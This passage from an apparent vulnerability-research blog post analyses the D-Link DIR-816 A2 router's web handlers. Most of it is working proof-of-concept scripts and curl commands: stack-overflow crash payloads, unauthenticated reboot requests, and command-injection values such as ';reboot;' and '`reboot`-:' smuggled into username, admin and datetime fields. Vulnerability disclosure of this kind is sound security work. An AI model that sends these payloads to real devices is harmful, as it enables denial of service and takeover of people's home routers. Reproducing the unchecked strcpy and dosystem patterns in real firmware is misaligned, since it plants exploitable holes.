<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/editassignment'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'s_ip'</span> : <span class="string">'a'</span> * <span class="number">0x400</span>,</span><br><span class="line">    <span class="string">'s_mac'</span> : <span class="string">'a'</span> * <span class="number">0x400</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="form2Wan-cgi"><a href="#form2Wan-cgi" class="headerlink" title="form2Wan.cgi"></a>form2Wan.cgi</h3><p><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/23.png"></p>
<p>When wantype is 3, l2tp_usrname will be decrypted by base64, and the result will be stored in v94, which does not check the size of l2tp_usrname, resulting in stack overflow</p>
<p>如下poc即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/form2Wan.cgi'</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(<span class="string">b'a'</span> * <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'wantype'</span> : <span class="string">'3'</span>,</span><br><span class="line">    <span class="string">'l2tp_usrname'</span> : payload,</span><br><span class="line">    <span class="string">'l2tp_psword'</span> : payload</span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="setMac"><a href="#setMac" class="headerlink" title="setMac"></a>setMac</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">setMAC</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> macCloneEnbl; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> *macCloneMac; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">24</span>]; <span class="comment">// [sp+18h] [-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  macCloneEnbl = websGetVar(a1, <span class="string">"macCloneEnbl"</span>, <span class="string">"0"</span>);</span><br><span class="line">  macCloneMac = websGetVar(a1, <span class="string">"macCloneMac"</span>, <span class="string">""</span>);</span><br><span class="line">  nvram_bufset(<span class="number">0</span>, <span class="string">"macCloneEnabled"</span>, macCloneEnbl);</span><br><span class="line">  nvram_bufget(<span class="number">0</span>);</span><br><span class="line">  v4 = <span class="built_in">strncmp</span>(macCloneEnbl, &amp;word_4784D8, <span class="number">2</span>);</span><br><span class="line">  v5 = macCloneMac;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( getIfMac(<span class="string">"eth2.2"</span>, v7) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">strcpy</span>(v7, macCloneMac);</span><br><span class="line">    v5 = v7;</span><br><span class="line">  }</span><br><span class="line">  nvram_bufset(<span class="number">0</span>, <span class="string">"macCloneMac"</span>, v5);</span><br><span class="line">  nvram_commit(<span class="number">0</span>);</span><br><span class="line">  initInternet();</span><br><span class="line">  <span class="keyword">return</span> websRedirect(a1, <span class="string">"mac_clone.asp"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>对这个功能请求的时候无论如何都会执行到initInternet这个函数，也就造成了无认证即可对路由器进行网络初始化。如下poc可以进行验证</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http:<span class="comment">//192.168.0.1/goform/setMAC -d tokenid=xxxx</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="addRouting"><a href="#addRouting" class="headerlink" title="addRouting"></a>addRouting</h3><p>这个函数的漏洞还是很明显的。</p>
<img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/4.png" style="zoom:50%;">

<p>hostnet填入net进入stract(v14, dest)这里，会将dest拼接到v14后面，这里并没有对大小进行验证，所以存在栈溢出漏洞。</p>
<p>构造以下poc即可使得路由器crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'xxx'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/addRouting'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'dest'</span> : <span class="string">'a'</span> * <span class="number">10000</span>, </span><br><span class="line">    <span class="string">'hostnet'</span> : <span class="string">'net'</span>,</span><br><span class="line">    <span class="string">'netmask'</span> : <span class="string">'255.255.255.0'</span>,</span><br><span class="line">    <span class="string">'gateway'</span> : <span class="string">'192.168.0.1'</span>,</span><br><span class="line">    <span class="string">'interface'</span> : <span class="string">'LAN'</span>,</span><br><span class="line">    <span class="string">'custom_interface'</span> : <span class="string">'br0'</span>,</span><br><span class="line">    <span class="string">'comment'</span> : <span class="string">'a'</span> * <span class="number">10000</span></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="setNetworkLan"><a href="#setNetworkLan" class="headerlink" title="setNetworkLan"></a>setNetworkLan</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/5.png" style="zoom:50%;">

<img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/6.png" style="zoom:50%;">

<p>通过strncpy函数将lanip放入v4，接着使用strcpy将v4拷贝到v6和v5中，其中并没有限制大小，存在栈溢出漏洞。</p>
<p>构造以下poc即可使得路由器crash</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">li = lambda x : print(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = lambda x : print(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'xxx'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/setNetworkLan'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'lanIp'</span> : <span class="string">'a'</span> * <span class="number">10000</span></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="form2Dhcpip-cgi"><a href="#form2Dhcpip-cgi" class="headerlink" title="form2Dhcpip.cgi"></a>form2Dhcpip.cgi</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/7.png" style="zoom:50%;">

<p>将lan_assignment设置为add，会有strcat将nvmacaddr和ipaddr拼接到v21后，这里并没有大小验证，存在栈溢出漏洞。</p>
<p>构造如下poc即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1957747793'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/form2Dhcpip.cgi'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'lan_assignment'</span> : <span class="string">'add'</span>,</span><br><span class="line">    <span class="string">'nvmacaddr'</span> : <span class="string">'a'</span> * <span class="number">10000</span>,</span><br><span class="line">    <span class="string">'ipaddr'</span> : <span class="string">'a'</span> * <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br></pre></td></tr></tbody></table></figure>

<h2 id="formDefineUtilities"><a href="#formDefineUtilities" class="headerlink" title="formDefineUtilities"></a>formDefineUtilities</h2><h3 id="form2Reboot-cgi"><a href="#form2Reboot-cgi" class="headerlink" title="form2Reboot.cgi"></a>form2Reboot.cgi</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/21.png" style="zoom:50%;">

<p> The reboot value is 1 to execute the reboot statement</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/form2Reboot.cgi -d tokenid=xxxxx -d <span class="string">'reboot=1'</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="doReboot"><a href="#doReboot" class="headerlink" title="doReboot"></a>doReboot</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/22.png" style="zoom:50%;">

<p>No authentication is required, and reboot is executed when the function returns at the end</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/doReboot -d tokenid=xxxx</span><br></pre></td></tr></tbody></table></figure>

<h2 id="form-define-ip-control"><a href="#form-define-ip-control" class="headerlink" title="form_define_ip_control"></a>form_define_ip_control</h2><h3 id="form2IPQoSTcAdd"><a href="#form2IPQoSTcAdd" class="headerlink" title="form2IPQoSTcAdd"></a>form2IPQoSTcAdd</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/8.png" style="zoom:50%;">

<p>通过proto参数传送的内容最后会通过sprintf给到v11，其中并没有大小检查，存在栈溢出漏洞。</p>
<p>如下poc即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/form2IPQoSTcAdd'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'proto'</span> : <span class="string">'a'</span> * <span class="number">10000</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h2 id="formDefineFirewall"><a href="#formDefineFirewall" class="headerlink" title="formDefineFirewall"></a>formDefineFirewall</h2><h3 id="websHostFilter"><a href="#websHostFilter" class="headerlink" title="websHostFilter"></a>websHostFilter</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/9.png" style="zoom:50%;">

<p>通过addhostfilter参数得到的内容赋值给了v4，并利用strcat函数将v4的值拼接到v7后面，并没有检查大小，导致栈溢出。</p>
<p>如下poc即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1714636915'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/websHostFilter'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'addHostFilter'</span> : <span class="string">'a'</span> * <span class="number">100000</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="websURLFilter"><a href="#websURLFilter" class="headerlink" title="websURLFilter"></a>websURLFilter</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/10.png" style="zoom:50%;">

<p>和上一个一样，poc如下即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/websURLFilter'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'addURLFilter'</span> : <span class="string">'a'</span> * <span class="number">100000</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="websURLFilterAddDel"><a href="#websURLFilterAddDel" class="headerlink" title="websURLFilterAddDel"></a>websURLFilterAddDel</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/11.png" style="zoom:50%;">

<p>urladd会赋值给v9，最利用strcat函数拼接到v10后面，这里并没有对大小进行检查，存在栈溢出漏洞。</p>
<p>如下poc即可crash</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1681692777'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/websURLFilterAddDel'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'urlAdd'</span> : <span class="string">'a'</span> * <span class="number">10000</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h2 id="formDefineManagement"><a href="#formDefineManagement" class="headerlink" title="formDefineManagement"></a>formDefineManagement</h2><h3 id="form2userconfig-cgi"><a href="#form2userconfig-cgi" class="headerlink" title="form2userconfig.cgi"></a>form2userconfig.cgi</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/12.png" style="zoom:50%;">

<p>username and newpass are brought into the dosystem function after base64 decryption, so there is a command injection vulnerability</p>
<p>poc如下即可达成reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /goform/form2userconfig.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.15</span>; rv:<span class="number">102.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">102.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">175</span></span><br><span class="line">Origin: http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/d_userconfig.asp</span><br><span class="line">Cookie: curShow=</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">username=JztyZWJvb3Q7Jw==&amp;oldpass=&amp;newpass=bm9uZ25vbmc%3D&amp;confpass=bm9uZ25vbmc%3D&amp;modify=%E4%BF%AE%E6%<span class="number">94</span>%B9&amp;select=s0&amp;hiddenpass=&amp;submit.htm%3Fuserconfig.htm=Send&amp;tokenid=<span class="number">1804289383</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="setSysAdm"><a href="#setSysAdm" class="headerlink" title="setSysAdm"></a>setSysAdm</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/13.png" style="zoom:50%;">

<p>admuser会直接传入到dosystem这里，导致命令注入漏洞的发生。</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">tokenid = <span class="string">'1804289383'</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.0.1/goform/setSysAdm'</span></span><br><span class="line"></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tokenid'</span> : tokenid,</span><br><span class="line">    <span class="string">'admuser'</span> : <span class="string">';reboot;'</span>,</span><br><span class="line">    <span class="string">'admpass'</span> : <span class="string">''</span></span><br><span class="line">}</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">response.encoding=<span class="string">"utf-8"</span></span><br><span class="line">info = response.text</span><br><span class="line">li(url)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br></pre></td></tr></tbody></table></figure>

<h3 id="form2systime-cgi"><a href="#form2systime-cgi" class="headerlink" title="form2systime.cgi"></a>form2systime.cgi</h3><img src="/2022/07/28/D-Link-Dir-816-A2%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20copy/14.png" style="zoom:50%;">

<p> the Command injection vulnerability only needs to be met by datetime -:</p>
<p>如下poc即可reboot</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/goform/form2systime.cgi -d tokenid=xxxxx -d <span class="string">'datetime=`reboot`-:'</span></span><br></pre></td></tr></tbody></table></figure>

